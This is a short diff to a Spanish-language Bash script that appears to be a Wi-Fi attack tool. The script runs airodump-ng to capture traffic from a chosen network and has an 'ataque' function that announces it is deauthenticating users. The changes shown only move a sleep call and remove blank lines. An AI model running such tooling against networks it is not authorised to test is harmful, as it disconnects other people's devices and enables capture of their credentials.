@@ -43,7 +43,6 @@ inicio_ataque
 
 olfateo ()
 {
-sleep 1
 sudo airodump-ng --bssid $1 --channel $2 --write captura $interface
 sudo killall airodump-ng
 sleep 1
@@ -51,6 +50,7 @@ ataque
 }
 ataque ()
 {
+sleep 1
 printf "${yellowColour}[>:)]${endColour}${greenColour} Desautenticando usuarios ${endColour}\n"
 sleep 1
 var=2
@@ -66,12 +66,6 @@ resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 let "var++"
 
 done
-
-
-
-
-
-
 }
 
 inicio_ataque ()
